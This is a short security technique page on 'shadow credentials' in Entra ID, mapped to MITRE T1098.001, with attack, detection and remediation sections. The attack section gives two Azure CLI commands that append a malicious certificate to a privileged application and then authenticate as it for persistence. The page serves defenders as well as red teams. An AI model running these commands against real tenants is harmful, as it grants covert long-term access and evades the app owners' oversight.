# [PE-ACCTMGMT-017]: Shadow Principal Configuration (Hidden SPs)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-017 |
| **MITRE ATT&CK v18.1** | [Account Manipulation: Additional Cloud Credentials (T1098.001)](https://attack.mitre.org/techniques/T1098/001/) |
| **Tactic** | Persistence / Privilege Escalation |
| **Platforms** | Entra ID |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** A "Shadow Principal" is a Service Principal (SP) that is granted permissions *directly* (e.g., via AppRoleAssignment or PIM) but is kept hidden from standard user lists. Attackers can create an SP, generate a long-lived certificate (valid for 10 years), assign it high privileges (e.g., `User.ReadWrite.All`), and then delete the visible "App Registration" (if possible, though usually deleting App Reg deletes SP). A more common variant is to add a *second* Service Principal credential (certificate) to a legitimate, high-privilege Application. This "Shadow Credential" allows the attacker to authenticate as that legitimate app without alerting the owners.
- **Attack Surface:** Service Principal Credentials.
- **Business Impact:** **Long-Term Persistence**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Application Administrator / Cloud Application Administrator.
- **Tools:**
    - `az ad app credential`
    - [AADInternals](https://github.com/Gerenios/AADInternals)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Identify High-Priv App**
Find an app with `Directory.ReadWrite.All`.

**Step 2: Add Shadow Credential**
Add a self-signed certificate to the app *without* removing existing secrets.
```bash
az ad app credential reset --id <AppID> --append --cert @malicious.pem
```

**Step 3: Authenticate**
Use the certificate to login anytime.
```bash
az login --service-principal -u <AppID> -p malicious.pem --tenant <TenantID>
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **AuditLogs** | `Update application` | "Update key credentials" or "Update password credentials". Look for additions (Action: `Add`) where the initiator is not the App Owner. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Credential Audit:** Run a script to list all expiration dates of secrets/certs. Investigate any certs valid for > 2 years or added recently by non-owners.
*   **Workflow:** Require "Admin Consent" or PIM for any credential addition.

## 7. ATTACK CHAIN
> **Preceding Technique:** [PE-ACCTMGMT-001]
> **Next Logical Step:** [PE-VALID-011]
